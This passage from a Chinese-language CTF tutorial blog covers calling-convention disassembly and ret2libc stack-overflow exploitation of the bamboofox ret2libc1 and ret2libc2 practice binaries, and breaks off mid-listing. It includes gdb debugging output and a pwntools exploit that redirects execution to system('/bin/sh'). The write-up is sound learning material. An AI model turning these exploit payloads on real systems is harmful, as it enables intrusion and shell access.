                       # 计算返回值 </span><br><span class="line">0x080483fb &lt;+32&gt;:leave                                            # (mov esp, ebp; pop ebp) </span><br><span class="line">0x080483fc &lt;+33&gt;:ret                                              # 函数返回 (pop eip)</span><br></pre></td></tr></table></figure><blockquote><p>x86-64</p></blockquote><p>对于 x86-64 的程序，前6 个参数分别通过rdi、rsi、rdx、rcx、r8和r9进行传递，剩余参数才像x86一样从后向前依次压栈。除此之外，我们还发现func()没有下移rsp开辟栈空间的操作，导致rbp和rsp的值是相同的，其实这是一项编译优化：根据AMD64 ABI文档的描述，rsp以下128字节的区域被称为red zone，这是一块被保留的内存，不会被信号或者中断所修改。于是，func()作为叶子函数就可以在不调整栈指针的情况下，使用这块内存保存临时数据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">gef➤ disassemble main </span><br><span class="line">0x000000000040050a &lt;+0&gt;: push rbp                    # 将栈底 rbp 压栈 (rsp -&#x3D; 8) </span><br><span class="line">0x000000000040050b &lt;+1&gt;: mov rbp,rsp                 # 更新 rbp 为当前栈顶 rsp </span><br><span class="line">0x000000000040050e &lt;+4&gt;: push 0x58                   # 将 arg8 压栈 (rsp -&#x3D; 8) </span><br><span class="line">0x0000000000400510 &lt;+6&gt;: push 0x4d                   # 将 arg7 压栈 (rsp -&#x3D; 8) </span><br><span class="line">0x0000000000400512 &lt;+8&gt;: mov r9d,0x42                # 将 arg6 赋值给 r9 </span><br><span class="line">0x0000000000400518 &lt;+14&gt;: mov r8d,0x37               # 将 arg5 赋值给 r8 </span><br><span class="line">0x000000000040051e &lt;+20&gt;: mov ecx,0x2c               # 将 arg4 赋值给 rcx </span><br><span class="line">0x0000000000400523 &lt;+25&gt;: mov edx,0x21               # 将 arg3 赋值给 rdx </span><br><span class="line">0x0000000000400528 &lt;+30&gt;: mov esi,0x16               # 将 arg2 赋值给 rsi </span><br><span class="line">0x000000000040052d &lt;+35&gt;: mov edi,0xb                # 将 arg1 赋值给 rdi </span><br><span class="line">0x0000000000400532 &lt;+40&gt;: call 0x4004d6 &lt;func&gt;       # 调用 func (push 0x400537) </span><br><span class="line">0x0000000000400537 &lt;+45&gt;: add rsp,0x10               # 恢复栈顶 rsp </span><br><span class="line">0x000000000040053b &lt;+49&gt;: leave                      # (mov rsp, rbp; pop rbp) </span><br><span class="line">0x000000000040053c &lt;+50&gt;: ret                        # 函数返回 (pop rip) </span><br><span class="line">gef➤ disassemble func </span><br><span class="line">0x00000000004004d6 &lt;+0&gt;: push rbp                    # 将栈底 rbp 压栈 (rsp -&#x3D; 8) </span><br><span class="line">0x00000000004004d7 &lt;+1&gt;: mov rbp,rsp                 # 更新 rbp 为当前栈顶 rsp </span><br><span class="line">0x00000000004004da &lt;+4&gt;: mov DWORD PTR [rbp-0x14],edi </span><br><span class="line">0x00000000004004dd &lt;+7&gt;: mov DWORD PTR [rbp-0x18],esi </span><br><span class="line">0x00000000004004e0 &lt;+10&gt;: mov DWORD PTR [rbp-0x1c],edx </span><br><span class="line">0x00000000004004e3 &lt;+13&gt;: mov DWORD PTR [rbp-0x20],ecx </span><br><span class="line">0x00000000004004e6 &lt;+16&gt;: mov DWORD PTR [rbp-0x24],r8d </span><br><span class="line">0x00000000004004ea &lt;+20&gt;: mov DWORD PTR [rbp-0x28],r9d </span><br><span class="line">0x00000000004004ee &lt;+24&gt;: mov eax,DWORD PTR [rbp-0x14] </span><br><span class="line">0x00000000004004f1 &lt;+27&gt;: add eax,0x1 </span><br><span class="line">0x00000000004004f4 &lt;+30&gt;: mov DWORD PTR [rbp-0x8],eax </span><br><span class="line">0x00000000004004f7 &lt;+33&gt;: mov eax,DWORD PTR [rbp+0x18] </span><br><span class="line">0x00000000004004fa &lt;+36&gt;: add eax,0x8 </span><br><span class="line">0x00000000004004fd &lt;+39&gt;: mov DWORD PTR [rbp-0x4],eax </span><br><span class="line">0x0000000000400500 &lt;+42&gt;: mov edx,DWORD PTR [rbp-0x8] </span><br><span class="line">0x0000000000400503 &lt;+45&gt;: mov eax,DWORD PTR [rbp-0x4] </span><br><span class="line">0x0000000000400506 &lt;+48&gt;: add eax,edx                # 计算返回值 </span><br><span class="line">0x0000000000400508 &lt;+50&gt;: pop rbp                    # 恢复 rbp (rsp +&#x3D; 8) </span><br><span class="line">0x0000000000400509 &lt;+51&gt;: ret                        # 函数返回 (pop rip)</span><br></pre></td></tr></table></figure><blockquote><h2 id="绕过NX保护"><a href="#绕过NX保护" class="headerlink" title="绕过NX保护"></a>绕过NX保护</h2></blockquote><h3 id="Ret2libc"><a href="#Ret2libc" class="headerlink" title="Ret2libc"></a>Ret2libc</h3><p>Bypass DEP 通过ret2libc绕过DEP防护，现在我们把DEP打开，依然关闭stack protector和ASLR。这时候我们按上篇无保护的思路来做题的话，系统会拒绝执行我们的shellcode。如果你通过<code>sudo cat /proc/[pid]/maps</code>查看，stack是rw的而不是rwx。</p><p>三道题分布对应下面三个小结</p><ul><li><a href="https://raw.githubusercontent.com/Ascotbe/Random-img/master/StackOverflow/ret2libc1">ret2libc1</a></li><li><a href="https://raw.githubusercontent.com/Ascotbe/Random-img/master/StackOverflow/ret2libc2">ret2libc2</a></li><li><a href="https://raw.githubusercontent.com/Ascotbe/Random-img/master/StackOverflow/ret2libc3">ret2libc3</a></li></ul><h4 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">                            栈  （进入危险函数之前） </span><br><span class="line">&lt;-------------------------------------------------------------&gt;</span><br><span class="line">    ESP &lt;------&gt; EBP         call function             args</span><br><span class="line">|--------------------|-------------|----------------|---------|</span><br><span class="line">|     ..........     | JMP 函数地址  |  PUSH 返回地址  |  value  |</span><br><span class="line">|--------------------|-------------|----------------|---------|</span><br><span class="line">                  利用溢出覆盖返回地址和参数</span><br><span class="line">                  </span><br><span class="line">                             </span><br><span class="line">                             |</span><br><span class="line">                             |</span><br><span class="line">                             |</span><br><span class="line">                             v</span><br><span class="line">                    栈  （进入危险函数之后）</span><br><span class="line"> &lt;-------------------------------------------&gt;</span><br><span class="line">    ESP &lt;------&gt; EBP       EIP        args</span><br><span class="line">|--------------------|-------------|---------|</span><br><span class="line">|     ..........     | return addr |  value  |</span><br><span class="line">|--------------------|-------------|---------|</span><br><span class="line">                  利用溢出覆盖返回地址和参数</span><br><span class="line">                             |</span><br><span class="line">                             |</span><br><span class="line">                             |</span><br><span class="line">                             v</span><br><span class="line">                           </span><br><span class="line">                      栈 （覆盖之后）</span><br><span class="line">&lt;------------------------------------------------------------------------------------------&gt;</span><br><span class="line">        ESP              EBP                           call function               args</span><br><span class="line">|-----------------|-------------|----------------------------|-----------------|-----------|</span><br><span class="line">| AAAAAAAAAAAAAAAAAAAAAAAAAAAAA | JMP (system function addr) | PUSH return addr| &quot;&#x2F;bin&#x2F;sh&quot; |</span><br><span class="line">|-----------------|-------------|----------------------------|-----------------|-----------|</span><br><span class="line"></span><br><span class="line">最终结果：</span><br><span class="line">1.把返回地址的值覆盖为system()函数的地址</span><br><span class="line">2.正常执行栈</span><br><span class="line">3.执行完栈后调用RET汇编指令（POP出system()函数的地址，把EIP指向system()函数的地址）</span><br><span class="line">4.当执行完第三步后，就会构成一个新的栈：参数-&gt;call system函数</span><br><span class="line">5.执行新构建的栈，进而获取控制台权限</span><br></pre></td></tr></table></figure><hr><h4 id="存在system-函数和-bin-sh字符串"><a href="#存在system-函数和-bin-sh字符串" class="headerlink" title="存在system()函数和/bin/sh字符串"></a>存在system()函数和/bin/sh字符串</h4><p>以 bamboofox 中 ret2libc1 为例，首先，我们可以检查一下程序的安全保护</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/Desktop$ checksec ret2libc1</span><br><span class="line">[*] <span class="string">&#x27;/home/kali/Desktop/ret2libc1&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>源程序为 32 位，开启了 NX 保护。下面来看一下程序源代码，确定漏洞位置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;RET2LIBC &gt;_&lt;&quot;</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在执行 gets 函数的时候出现了栈溢出，接着定位溢出值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pattern create 200</span><br><span class="line"><span class="string">&#x27;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&#x27;</span></span><br><span class="line">gdb-peda$ run</span><br><span class="line">Starting program: /home/kali/Desktop/ret2libc1 </span><br><span class="line">RET2LIBC &gt;_&lt;</span><br><span class="line">AAA%AAsAABAA<span class="variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x0 </span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0xf7fb0580 --&gt; 0xfbad2288 </span><br><span class="line">EDX: 0xfbad2288 </span><br><span class="line">ESI: 0xf7fb0000 --&gt; 0x1e4d6c </span><br><span class="line">EDI: 0xf7fb0000 --&gt; 0x1e4d6c </span><br><span class="line">EBP: 0x6941414d (<span class="string">&#x27;MAAi&#x27;</span>)</span><br><span class="line">ESP: 0xffffd220 (<span class="string">&quot;ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">EIP: 0x41384141 (<span class="string">&#x27;AA8A&#x27;</span>)</span><br><span class="line">EFLAGS: 0x10246 (carry PARITY adjust ZERO sign <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">Invalid <span class="variable">$PC</span> address: 0x41384141</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd220 (<span class="string">&quot;ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">0004| 0xffffd224 (<span class="string">&quot;jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">0008| 0xffffd228 (<span class="string">&quot;AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">0012| 0xffffd22c (<span class="string">&quot;AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">0016| 0xffffd230 (<span class="string">&quot;PAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">0020| 0xffffd234 (<span class="string">&quot;AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">0024| 0xffffd238 (<span class="string">&quot;AmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">0028| 0xffffd23c (<span class="string">&quot;RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x41384141 <span class="keyword">in</span> ?? ()</span><br><span class="line">gdb-peda$ pattern offset 0x41384141</span><br><span class="line">1094205761 found at offset: 112</span><br></pre></td></tr></table></figure><p>可以看到溢出的位置在112的地方</p><p>接着利用<strong>ropgadget</strong>，查看是否有<code>/bin/sh</code>存在</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/Desktop$ ROPgadget --binary ret2libc1 --string <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x08048720 : /bin/sh</span><br></pre></td></tr></table></figure><p>并且在IDA中可以看到有<code>system</code>这个函数，如果没有开启ASRL的话再Windows上面看到的地址和你在Linux运行后的地址是相同的</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/12.png?raw=true" alt="image-20201120115231916"></p><p>我们要的东西都齐了以后，接下来就是写EXP了，EXP中栈拼接对应上面的利用原理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;../ret2libc1&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">binsh_addr = <span class="number">0x08048720</span></span><br><span class="line">system_plt = <span class="number">0x08048460</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, system_plt, <span class="string">&#x27;b&#x27;</span> * <span class="number">4</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/13.png?raw=true" alt="image-20201120115749503"></p><p>payload在栈中的部署：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">                              +---------------------------+</span><br><span class="line">                              |          binsh_addr       | 部署binsh_addr作为汇编system函数的参数</span><br><span class="line">              +-              +---------------------------+</span><br><span class="line">              | PUSH 返回地址  |           bbbb            | 部署bbbb作为汇编正常调用system函数的返回地址 </span><br><span class="line">call system &lt;-|               +---------------------------+</span><br><span class="line">              | JMP 函数地址   |        system_plt         | 执行system_plt，覆盖原ret返回位置</span><br><span class="line">              +-              +---------------------------+</span><br><span class="line">                              |           aaaa            | aaaa覆盖原ebp位置</span><br><span class="line">                       ebp---&gt;+---------------------------+</span><br><span class="line">                              |           aaaa            | aaaa占位填满栈空间</span><br><span class="line">                              |           ....            |        ......</span><br><span class="line">                              |           aaaa            | aaaa占位填满栈空间</span><br><span class="line">                              |           aaaa            | aaaa占位填满栈空间</span><br><span class="line">                              |           aaaa            | aaaa占位填满栈空间</span><br><span class="line">                              +---------------------------+</span><br></pre></td></tr></table></figure><p>如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址（<strong>就是call指令下面的地址</strong>），而现在我们并不是正常调用，所以需要补上一个<code>bbbb</code>作为虚拟返回地址（<strong>也就是CALL指令拆分成两步中的第一步PUSH 返回地址</strong>）</p><hr><h4 id="只存在system-函数"><a href="#只存在system-函数" class="headerlink" title="只存在system()函数"></a>只存在system()函数</h4><p>以 bamboofox 中 ret2libc2为例，拿到文件依旧进行查看保护</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~/Desktop/Pwn$ checksec ret2libc2</span><br><span class="line">[*] <span class="string">&#x27;/home/ascotbe/Desktop/Pwn/ret2libc2&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>接着我们可以看到溢出函数依旧是上文中的那个并且<code>system()</code>的地址是<strong>0x08048490</strong></p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/14.png?raw=true" alt="image-20201120142854442"></p><p>但是我们用ROPgadget并无找到<code>/bin/sh</code>位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~/Desktop/Pwn$ ROPgadget --binary ret2libc2 --string <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br></pre></td></tr></table></figure><p>那我们怎么获取字符串呢？我们在PLT表中可以看到有一个<code>gets()</code>函数，这个函数可以用来获取字符串，并且地址为<strong>0x08048460</strong></p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/15.png?raw=true" alt="image-20201120144606722"></p><p>反汇编查看一下该函数</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/16.png?raw=true" alt="image-20201120144720027"></p><p>发现传入一个指针后即可返回指针指向的字符串，那么接着我们只需要找到一个可读可写的buffer区，通常会寻找<code>.bss</code>段，通过<strong>readelf</strong>命令来查找</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~/Desktop/Pwn$ readelf -S ret2libc2</span><br><span class="line">There are 35 section headers, starting at offset 0x1924:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 00002c 04   A  5   0  4</span><br><span class="line">  [ 5] .dynsym           DYNSYM          080481d8 0001d8 0000f0 10   A  6   1  4</span><br><span class="line">  [ 6] .dynstr           STRTAB          080482c8 0002c8 000096 00   A  0   0  1</span><br><span class="line">  [ 7] .gnu.version      VERSYM          0804835e 00035e 00001e 02   A  5   0  2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED         0804837c 00037c 000030 00   A  6   1  4</span><br><span class="line">  [ 9] .rel.dyn          REL             080483ac 0003ac 000018 08   A  5   0  4</span><br><span class="line">  [10] .rel.plt          REL             080483c4 0003c4 000058 08   A  5  12  4</span><br><span class="line">  [11] .init             PROGBITS        0804841c 00041c 000023 00  AX  0   0  4</span><br><span class="line">  [12] .plt              PROGBITS        08048440 000440 0000c0 04  AX  0   0 16</span><br><span class="line">  [13] .text             PROGBITS        08048500 000500 000242 00  AX  0   0 16</span><br><span class="line">  [14] .fini             PROGBITS        08048744 000744 000014 00  AX  0   0  4</span><br><span class="line">  [15] .rodata           PROGBITS        08048758 000758 000065 00   A  0   0  4</span><br><span class="line">  [16] .eh_frame_hdr     PROGBITS        080487c0 0007c0 000034 00   A  0   0  4</span><br><span class="line">  [17] .eh_frame         PROGBITS        080487f4 0007f4 0000d0 00   A  0   0  4</span><br><span class="line">  [18] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4</span><br><span class="line">  [19] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4</span><br><span class="line">  [20] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4</span><br><span class="line">  [21] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4</span><br><span class="line">  [22] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4</span><br><span class="line">  [23] .got.plt          PROGBITS        0804a000 001000 000038 04  WA  0   0  4</span><br><span class="line">  [24] .data             PROGBITS        0804a038 001038 000008 00  WA  0   0  4</span><br><span class="line">  [25] .bss              NOBITS          0804a040 001040 0000a4 00  WA  0   0 32</span><br><span class="line">  [26] .comment          PROGBITS        00000000 001040 00002b 01  MS  0   0  1</span><br><span class="line">  [27] .debug_aranges    PROGBITS        00000000 00106b 000020 00      0   0  1</span><br><span class="line">  [28] .debug_info       PROGBITS        00000000 00108b 000329 00      0   0  1</span><br><span class="line">  [29] .debug_abbrev     PROGBITS        00000000 0013b4 0000f8 00      0   0  1</span><br><span class="line">  [30] .debug_line       PROGBITS        00000000 0014ac 0000c2 00      0   0  1</span><br><span class="line">  [31] .debug_str        PROGBITS        00000000 00156e 00026d 01  MS  0   0  1</span><br><span class="line">  [32] .shstrtab         STRTAB          00000000 0017db 000146 00      0   0  1</span><br><span class="line">  [33] .symtab           SYMTAB          00000000 001e9c 000540 10     34  50  4</span><br><span class="line">  [34] .strtab           STRTAB          00000000 0023dc 000314 00      0   0  1</span><br></pre></td></tr></table></figure><p>我们可以发现<strong>.bss</strong>是从<strong>0x0804a040</strong>的位置开始的，然后按着这个段找到了<strong>0x0804A080</strong>这个位置是个char数组</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/17.png?raw=true" alt="image-20201120182503721"></p><p>接着可以看到<strong>.bss</strong>是能读写，由于程序在gdb中运行，就算关闭了ALSR也会和在gdb外运行不同。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/Desktop/Pwn$ gdb -q ret2libc2</span><br><span class="line">Reading symbols from ret2libc2...</span><br><span class="line">gdb-peda$ run </span><br><span class="line">Starting program: /home/kali/Desktop/Pwn/ret2libc2 </span><br><span class="line">Something surprise here, but I don<span class="string">&#x27;t think it will work.</span></span><br><span class="line"><span class="string">What do you think ?</span></span><br><span class="line"><span class="string">[Inferior 1 (process 10047) exited normally]</span></span><br><span class="line"><span class="string">Warning: not running</span></span><br><span class="line"><span class="string">gdb-peda$ vmmap</span></span><br><span class="line"><span class="string">Warning: not running</span></span><br><span class="line"><span class="string">Start      End        Perm      Name</span></span><br><span class="line"><span class="string">0x0804841c 0x08048758 rx-p      /home/kali/Desktop/Pwn/ret2libc2</span></span><br><span class="line"><span class="string">0x08048154 0x080488c4 r--p      /home/kali/Desktop/Pwn/ret2libc2</span></span><br><span class="line"><span class="string">0x08049f08 0x0804a0e4 rw-p      /home/kali/Desktop/Pwn/ret2libc2</span></span><br></pre></td></tr></table></figure><p>接着寻找<code>add esp, 4</code>这样的指令，至于为什么呢因为我们调用gets()函数的时候push了一个参数也就是<code>/bin/sh</code>，函数结束的话如果不让堆栈平衡，那么最后结束整个函数的时候ebp的值回比原来低，具体低4个字节还是8个看进程的位数去。最后在这题结束会放个c程序调试的例子作为解释</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~/Desktop/Pwn$ ROPgadget --binary ret2libc2 --only <span class="string">&#x27;pop|ret&#x27;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span 